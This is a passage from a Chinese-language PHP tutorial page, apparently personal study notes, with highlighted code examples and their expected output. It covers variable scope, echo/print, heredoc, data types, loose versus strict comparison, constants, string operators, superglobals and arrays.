punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$y</span><span class=\"token operator\">=</span><span class=\"token variable\">$x</span><span class=\"token operator\">+</span><span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">myTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">testest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">static</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//该变量会保留上次调用函数产生的值</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">testest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p&gt;测试函数外变量:&lt;p&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"变量 x 为: <span class=\"token interpolation\"><span class=\"token variable\">$x</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"变量 y 为: <span class=\"token interpolation\"><span class=\"token variable\">$y</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">yourTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p&gt;测试函数外变量:&lt;p&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"变量 x 为: <span class=\"token interpolation\"><span class=\"token variable\">$x</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"变量 y 为: <span class=\"token interpolation\"><span class=\"token variable\">$y</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n    \n/*\n测试函数内变量:\n\n变量 x 为:\n变量 y 为: 101\n\n测试函数外变量:\n\n变量 x 为: 5\n变量 y 为: 10\n\n测试函数外变量:\n\n变量 x 为: 5\n变量 y 为: 15\n*/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"echo-print\"><a href=\"#echo-print\" class=\"headerlink\" title=\"echo/print\"></a>echo/print</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token operator\">-</span> 可以输出一个或多个字符串\n<span class=\"token keyword\">print</span> <span class=\"token operator\">-</span> 只允许输出一个字符串，返回值总为 <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"PHP-EOF\"><a href=\"#PHP-EOF\" class=\"headerlink\" title=\"PHP_EOF\"></a>PHP_EOF</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token operator\">.</span><span class=\"token constant\">PHP_EOP</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"EOF\"><a href=\"#EOF\" class=\"headerlink\" title=\"EOF\"></a>EOF</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;</span>EOF</span>\n        &lt;h1&gt;我的第一个标题&lt;/h1&gt;\n        &lt;p&gt;我的第一个段落。&lt;/p&gt;\n<span class=\"token delimiter symbol\">EOF<span class=\"token punctuation\">;</span></span></span>\n<span class=\"token comment\">// 结束需要独立一行且前后不能空格</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello world\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$y</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'djh $x'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$z</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"djh <span class=\"token interpolation\"><span class=\"token variable\">$x</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$z</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"aaa\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"bbbb\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'aa'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'djh'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x8C</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token number\">0x8C</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//16进制</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">047</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//8进制</span>\n<span class=\"token variable\">$e</span><span class=\"token operator\">=</span><span class=\"token number\">2.4e3</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$f</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$g</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$g</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">==</span><span class=\"token variable\">$g</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">echo</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Car</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">var</span> <span class=\"token variable\">$color</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$color</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"green\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">color</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$color</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">what_color</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">color</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">print_vars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_object_vars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$prop</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\t<span class=\"token interpolation\"><span class=\"token variable\">$prop</span></span> = <span class=\"token interpolation\"><span class=\"token variable\">$val</span></span>\\n\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 实例一个对象</span>\n<span class=\"token variable\">$herbie</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"white\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 显示 herbie 属性</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\therbie: Properties\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_vars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$herbie</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\nstring(11) \"hello world\" string(6) \"djh $x\" string(15) \"djh hello world\" string(7) \"aaabbbb\" aaa satestdjhint(140) int(140) int(39) float(2400) bool(false) NULL 10 herbie: Properties color = white\n*/</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"类型比较\"><a href=\"#类型比较\" class=\"headerlink\" title=\"类型比较\"></a>类型比较</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//松散比较：使用两个等号 == 比较，只比较值，不比较类型。\n//严格比较：用三个等号 === 比较，除了比较值，也比较类型。\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'0 == false: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'0 === false: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'0 == null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">==</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'0 === null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">===</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'false == null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span> <span class=\"token operator\">==</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'false === null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span> <span class=\"token operator\">===</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"0\" == false: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0\"</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"0\" === false: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0\"</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"0\" == null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0\"</span> <span class=\"token operator\">==</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"0\" === null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0\"</span> <span class=\"token operator\">===</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"\" == false: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"\" === false: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"\" == null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">==</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\"\" === null: '</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">===</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\n//松散比较：使用两个等号 == 比较，只比较值，不比较类型。 //严格比较：用三个等号 === 比较，除了比较值，也比较类型。 0 == false: bool(true) 0 === false: bool(false) 0 == null: bool(true) 0 === null: bool(false) false == null: bool(true) false === null: bool(false) \"0\" == false: bool(true) \"0\" === false: bool(false) \"0\" == null: bool(false) \"0\" === null: bool(false) \"\" == false: bool(true) \"\" === false: bool(false) \"\" == null: bool(true) \"\" === null: bool(false)\n*/</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"常量\"><a href=\"#常量\" class=\"headerlink\" title=\"常量\"></a>常量</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 不区分大小写的常量名</span>\n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"GREETING\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"欢迎访问 Runoob.com\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> greeting<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 输出 \"欢迎访问 Runoob.com\"</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" world!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出Hello world! </span>\n \n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$x</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\" world!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出Hello world! </span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n    \n//Hello world!Hello world!<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$txt1</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Hello world!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$txt2</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"What a nice day!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$txt1</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$txt2</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"超级全局变量\"><a href=\"#超级全局变量\" class=\"headerlink\" title=\"超级全局变量\"></a>超级全局变量</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$GLOBALS</span>\n<span class=\"token variable\">$_SERVER</span>\n<span class=\"token variable\">$_REQUEST</span>\n<span class=\"token variable\">$_POST</span>\n<span class=\"token variable\">$_GET</span>\n<span class=\"token variable\">$_FILES</span>\n<span class=\"token variable\">$_ENV</span>\n<span class=\"token variable\">$_COOKIE</span>\n<span class=\"token variable\">$_SESSION</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ha\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"lo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Peter\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"35\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"Ben\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"37\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"Joe\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"43\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ages</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Peter'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"35\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ages</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Ben'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"37\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ages</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Joe'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"43\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Peter is \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Peter'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" years old.\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$x</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$x_value</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Key=\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\", Value=\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$x_value</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">asort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//键值升序</span>\n<span class=\"token keyword\">foreach</span><span class=\"token 